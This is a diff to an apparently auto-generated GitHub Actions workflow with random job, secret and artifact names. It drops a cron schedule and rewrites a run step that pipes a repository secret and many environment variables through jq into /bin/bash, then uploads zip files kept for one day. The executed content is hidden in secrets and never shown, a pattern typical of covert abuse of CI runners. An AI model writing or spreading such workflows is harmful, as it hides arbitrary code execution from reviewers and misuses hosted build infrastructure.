@@ -1,8 +1,7 @@
 name: calliekotlin6755
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '32 4,10,16,22 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,19 +9,26 @@ jobs:
       - uses: actions/checkout@v4
       - name: calliekotlin6755
         env:
-          npfu307: ${{ secrets.npfu307 }}
+          wj9604: ${{ secrets.wj9604 }}
         run: |
-          printf '%s' "$npfu307" | jq -r .c2 | /bin/bash
-          echo $k7 | jq -r .zns45 | /bin/bash
-          echo $jk9 | jq -r .dues0958 | /bin/bash
-          printf '%s' "$iol101" | jq -r .lbj64 | /bin/bash
-          printf '%s' "$zieut6" | jq -r .to96 | /bin/bash
-          printf '%s' "$qowd468" | jq -r .un39637 | /bin/bash
-          echo $ofetm7300 | jq -r .niq90730 | /bin/bash
+          printf '%s' "$wj9604" | jq -r .x9 | /bin/bash
+          printf '%s' "$y97" | jq -r .bgxez6 | /bin/bash
+          echo $f85 | jq -r .n6587 | /bin/bash
+          echo $t6 | jq -r .cdjvn9 | /bin/bash
+          printf '%s' "$wl16" | jq -r .ozsz894 | /bin/bash
+          printf '%s' "$eq36098" | jq -r .t080 | /bin/bash
+          printf '%s' "$pwlm7" | jq -r .puve79 | /bin/bash
+          echo $yvav675 | jq -r .bak43 | /bin/bash
+          printf '%s' "$ydi0" | jq -r .sgw5707 | /bin/bash
+          printf '%s' "$wwzxg11852" | jq -r .qib02782 | /bin/bash
+          printf '%s' "$sqsa2750" | jq -r .q8 | /bin/bash
+          printf '%s' "$ww57" | jq -r .c597 | /bin/bash
+          echo $kqbhv45 | jq -r .paou06 | /bin/bash
+          echo $z6 | jq -r .bmwgz4366 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: tJkjnJbm
+          name: nqyKs31P
           path: "*.zip"
           retention-days: 1
